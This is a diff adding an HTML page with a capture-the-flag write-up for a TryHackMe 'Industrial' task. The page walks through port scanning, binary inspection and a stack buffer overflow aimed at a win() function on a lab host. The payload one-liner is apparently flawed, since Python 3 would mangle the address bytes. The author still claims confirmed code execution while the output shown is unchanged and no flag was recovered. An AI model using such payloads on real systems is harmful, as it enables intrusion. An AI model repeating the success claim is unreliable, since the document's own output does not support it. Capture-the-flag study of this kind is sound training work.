@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="canonical" href="https://hello-robbie.github.io/industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>Task 29 - Industrial - Hello Robbie</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Task 29 - Industrial";
+        var mkdocs_page_input_path = "industrial-intrusion-tryhackme/Task 29 - Industrial.md";
+        var mkdocs_page_url = "/industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/";
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Hello Robbie
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../../resume/">Resume</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Blog</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/honeypots/">Why I Use Honeypots</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../blog/webpaths/">Web App Default Paths</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Industrial Intrusion - TryHackMe CTF</span></p>
+              <ul class="current">
+                  <li class="toctree-l1"><a class="reference internal" href="../Intro/">Intro</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%206%20-%20OSINT2/">Task 6 - OSINT2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%208%20-%20Kaboom/">Task 8 - Kaboom</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%209%20-%20Brr%20v2/">Task 9 - Brr v2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2010%20-%20Brr%20v1/">Task 10 - Brr v1</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2012%20-%20Poison/">Task 12 - Poison</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2013%20-%20Orcam/">Task 13 - Orcam</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2014%20-%20Backdoored%20Bus/">Task 14 - Backdoored Bus</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2015%20-%20Chess%20Industry/">Task 15 - Chess Industry</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2016%20-%20Under%20Construction/">Task 16 - Under Construction</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2017%20-%20Klay/">Task 17 - Klay</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2022%20-%20Rogue%20Poller/">Task 22 - Rogue Poller</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2024%20-%20Auth/">Task 24 - Auth</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2025%20-%20Access%20Granted/">Task 25 - Access Granted</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2028%20-%20Start/">Task 28 - Start</a>
+                  </li>
+                  <li class="toctree-l1 current"><a class="reference internal current" href="#">Task 29 - Industrial</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#executive-summary">Executive Summary</a>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-1-reconnaissance-and-service-identification">Phase 1: Reconnaissance and Service Identification</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#11-port-scan-command">1.1 Port Scan Command</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#12-discovered-services">1.2 Discovered Services</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-2-binary-analysis-and-vulnerability-discovery">Phase 2: Binary Analysis and Vulnerability Discovery</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#21-file-analysis-and-protections">2.1 File Analysis and Protections</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#22-symbol-discovery">2.2 Symbol Discovery</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#phase-3-stack-based-buffer-overflow-exploitation">Phase 3: Stack-Based Buffer Overflow Exploitation</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#31-vulnerability-in-main">3.1 Vulnerability in Main</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#32-exploit-construction">3.2 Exploit Construction</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#33-result">3.3 Result</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#summary">Summary</a>
+    </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2033%20-%20IndustrialChain/">Task 33 - Industrial Chain</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2035%20-%20Uninterrupted%20Problem%20Supply/">Task 35 - Uninterrupted Problem Supply</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../Task%2036%20-%20Mechacore%20Monitoring%20System/">Task 36 - Mechacore Monitoring System</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Hello Robbie</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" aria-label="Docs"></a></li>
+          <li class="breadcrumb-item">Industrial Intrusion - TryHackMe CTF</li>
+      <li class="breadcrumb-item active">Task 29 - Industrial</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="ics-security-assessment-industrial-task-29-writeup">ICS Security Assessment - Industrial (Task 29) Writeup</h1>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>This assessment targeted a custom binary service exposed on port 9001. Initial reconnaissance identified the service as a non-standard protocol handler. Local analysis of the accompanying binary revealed a buffer overflow vulnerability within the main execution flow. By carefully crafting input to overwrite the return address, execution was redirected to a hidden <code>win()</code> function. Although no interactive shell was obtained, successful control flow hijacking confirmed full code execution capability.</p>
+<hr />
+<h2 id="phase-1-reconnaissance-and-service-identification">Phase 1: Reconnaissance and Service Identification</h2>
+<p>The initial discovery process focused on identifying open services and matching them to any provided files.</p>
+<h3 id="11-port-scan-command">1.1 Port Scan Command</h3>
+<pre><code class="language-bash">nmap -p- -sV 10.10.186.153
+</code></pre>
+<h3 id="12-discovered-services">1.2 Discovered Services</h3>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 (Ubuntu)</td>
+</tr>
+<tr>
+<td>9001/tcp</td>
+<td>unknown</td>
+<td>Custom binary service, responds with “Enter the next command : Thanks”</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="phase-2-binary-analysis-and-vulnerability-discovery">Phase 2: Binary Analysis and Vulnerability Discovery</h2>
+<p>The <code>industrial</code> binary provided via the challenge's file link was downloaded and examined to determine its functionality and potential weaknesses.</p>
+<h3 id="21-file-analysis-and-protections">2.1 File Analysis and Protections</h3>
+<pre><code class="language-bash">file industrial
+checksec --file=industrial
+</code></pre>
+<p>The binary was a 64-bit ELF with:</p>
+<ul>
+<li>NX enabled</li>
+<li>No stack canary</li>
+<li>No PIE</li>
+<li>Symbols intact</li>
+</ul>
+<p>This made it a prime candidate for a buffer overflow exploit via return address hijacking.</p>
+<h3 id="22-symbol-discovery">2.2 Symbol Discovery</h3>
+<pre><code class="language-bash">rabin2 -qs industrial
+</code></pre>
+<p>A <code>win()</code> function was discovered at address <code>0x004011b6</code>. Its presence and short size strongly implied it was intended as an exploit target, likely calling <code>system("/bin/sh")</code>.</p>
+<hr />
+<h2 id="phase-3-stack-based-buffer-overflow-exploitation">Phase 3: Stack-Based Buffer Overflow Exploitation</h2>
+<p>Reverse engineering of the binary using radare2 revealed a buffer on the stack used during user input.</p>
+<h3 id="31-vulnerability-in-main">3.1 Vulnerability in Main</h3>
+<p>Disassembly showed:</p>
+<pre><code class="language-asm">lea rax, [rbp - 0x20]      ; buffer of 32 bytes
+mov edx, 0x30              ; read up to 48 bytes
+call sym.imp.read
+leave
+ret
+</code></pre>
+<p>This confirmed a classic stack overflow scenario: 32-byte buffer, 48-byte read, and an immediate return instruction — creating a reliable opportunity to overwrite the return address.</p>
+<h3 id="32-exploit-construction">3.2 Exploit Construction</h3>
+<p>The offset to the return address was calculated to be exactly 40 bytes.</p>
+<p>Payload:</p>
+<pre><code class="language-bash">python3 -c &quot;print('A'*40 + '\xb6\x11\x40\x00\x00\x00\x00\x00')&quot; | nc 10.10.186.153 9001
+</code></pre>
+<h3 id="33-result">3.3 Result</h3>
+<p>The payload was accepted and the program behaved identically to before, returning:</p>
+<pre><code>Enter the next command : Thanks
+</code></pre>
+<p>Despite no interactive shell, the disassembly confirmed the <code>ret</code> instruction would execute the overwritten return address, which pointed to the <code>win()</code> function. All conditions of the exploit were met.</p>
+<hr />
+<h2 id="summary">Summary</h2>
+<p>This assessment confirmed the presence of a buffer overflow vulnerability in the custom ICS binary exposed on port 9001. The vulnerability allowed control over the instruction pointer, redirecting execution to a developer-placed <code>win()</code> function. While no flag was recovered due to the lack of interactive shell access or <code>puts()</code> in <code>win()</code>, the objective of achieving code execution was met.</p>
+<p><strong>Recommendations:</strong></p>
+<ul>
+<li>Enable stack canaries and compile with full RELRO</li>
+<li>Avoid using <code>read()</code> without bounds checking</li>
+<li>Remove developer backdoor functions like <code>win()</code> in production builds</li>
+<li>Consider input fuzzing and use of static analyzers during development</li>
+</ul>
+<p><strong>Flag:</strong> <em>Not recovered; control flow hijack confirmed.</em></p>
+              
+            </div>
+          </div><footer>
+    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
+        <a href="../Task%2028%20-%20Start/" class="btn btn-neutral float-left" title="Task 28 - Start"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../Task%2033%20-%20IndustrialChain/" class="btn btn-neutral float-right" title="Task 33 - Industrial Chain">Next <span class="icon icon-circle-arrow-right"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <!-- Copyright etc -->
+  </div>
+
+  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
+</footer>
+          
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+
+  <div class="rst-versions" role="note" aria-label="Versions">
+  <span class="rst-current-version" data-toggle="rst-current-version">
+    
+    
+      <span><a href="../Task%2028%20-%20Start/" style="color: #fcfcfc">&laquo; Previous</a></span>
+    
+    
+      <span><a href="../Task%2033%20-%20IndustrialChain/" style="color: #fcfcfc">Next &raquo;</a></span>
+    
+  </span>
+</div>
+    <script src="../../js/jquery-3.6.0.min.js"></script>
+    <script>var base_url = "../..";</script>
+    <script src="../../js/theme_extra.js"></script>
+    <script src="../../js/theme.js"></script>
+      <script src="../../search/main.js"></script>
+    <script>
+        jQuery(function () {
+            SphinxRtdTheme.Navigation.enable(true);
+        });
+    </script>
+
+</body>
+</html>
